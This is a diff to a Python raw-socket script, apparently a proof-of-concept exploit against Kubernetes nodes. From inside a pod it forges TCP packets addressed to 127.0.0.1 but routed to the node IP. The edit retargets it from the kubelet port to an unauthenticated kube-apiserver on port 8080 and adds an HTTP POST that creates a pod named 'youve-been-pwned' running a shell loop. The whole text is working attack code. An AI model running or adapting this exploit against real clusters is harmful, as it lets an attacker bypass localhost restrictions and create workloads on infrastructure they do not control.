@@ -1,3 +1,4 @@
+import os
 import array
 import socket
 import struct
@@ -162,10 +163,10 @@ class TCPPacket:
 
 
 if __name__ == '__main__':
-    real_dst = '192.168.0.100' # node IP
+    real_dst = os.environ['NODE_IP']
     dst = '127.0.0.1' # localhost IP
-    dst_port = 10249 # kubelet port
-    src = '10.10.10.100' # pod IP
+    dst_port = 8080 # unauthenticated kube apiserver
+    src = os.environ['POD_IP']
     src_port = 25565 # i like minecraft
 
     s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
@@ -184,7 +185,10 @@ if __name__ == '__main__':
     s.sendto(packet, (real_dst, 0))
 
     # build and send the third packet: psh ack (with data)
-    data = b'GET / HTTP/1.0\r\nHost: 127.0.0.1\r\n\r\n'
+    #data = b'GET / HTTP/1.0\r\nHost: 127.0.0.1\r\n\r\n'
+    req_headers = b'POST /api/v1/namespaces/default/pods HTTP/1.0\r\nHost: 127.0.0.1\r\nContent-Type: application/json\r\nContent-Length: 213\r\n\r\n'
+    payload = b'{"apiVersion":"v1","kind":"Pod","metadata":{"name":"youve-been-pwned"},"spec":{"containers":[{"name":"alpine","image":"alpine:latest","command":["/bin/sh","-c","--"],"args":["while true; do echo PWNED; done;"]}]}}'
+    data = req_headers + payload
     tcp_flags = ("psh", "ack")
     packet = build_packet(real_dst, dst, dst_port, src, src_port, 1, ack, tcp_flags, data)
     packet += data
